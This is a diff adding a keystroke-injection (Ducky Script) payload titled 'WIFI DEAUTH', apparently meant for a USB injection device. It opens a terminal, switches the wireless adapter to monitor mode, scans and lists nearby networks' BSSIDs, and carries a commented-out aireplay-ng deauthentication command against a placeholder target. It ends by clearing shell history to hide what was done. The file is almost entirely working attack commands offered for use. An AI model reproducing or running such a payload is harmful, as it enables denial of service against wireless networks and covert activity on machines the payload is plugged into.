@@ -1,0 +1,81 @@
+# ============================================
+# WIFI DEAUTH - Deauthentication Attack
+# ============================================
+# Purpose: Disconnect clients from WiFi networks
+# Author: D3n14l0f53rv1c3
+# Requires: Monitor mode capable adapter
+# ============================================
+
+DELAY 1000
+
+# Open terminal
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+
+# Create working directory
+STRING mkdir -p /tmp/.wifi && cd /tmp/.wifi
+ENTER
+DELAY 300
+
+# Enable monitor mode
+STRING echo "=== ENABLE MONITOR MODE ==="
+ENTER
+DELAY 100
+STRING sudo airmon-ng check kill
+ENTER
+DELAY 2000
+STRING sudo airmon-ng start wlan0
+ENTER
+DELAY 3000
+
+# Scan for targets
+STRING echo "=== SCANNING NETWORKS ==="
+ENTER
+DELAY 100
+STRING sudo airodump-ng wlan0mon -w scan --output-format csv &
+ENTER
+DELAY 10000
+
+# Stop scan
+STRING kill %1 2>/dev/null
+ENTER
+DELAY 500
+
+# Show targets
+STRING echo "=== TARGET NETWORKS ==="
+ENTER
+DELAY 100
+STRING cat scan-01.csv | grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | head -10
+ENTER
+DELAY 1000
+
+# Deauth specific target (replace TARGET_BSSID)
+STRING echo "=== DEAUTH TARGET ==="
+ENTER
+DELAY 100
+STRING echo "Edit TARGET_BSSID in payload before use"
+ENTER
+DELAY 100
+STRING # sudo aireplay-ng -0 10 -a TARGET_BSSID wlan0mon
+ENTER
+DELAY 500
+
+# Clean up
+STRING sudo airmon-ng stop wlan0mon
+ENTER
+DELAY 1000
+STRING sudo systemctl restart NetworkManager
+ENTER
+DELAY 2000
+
+# Clear history
+STRING history -c
+ENTER
+STRING clear
+ENTER
+
+STRING echo "WiFi deauth complete"
+ENTER
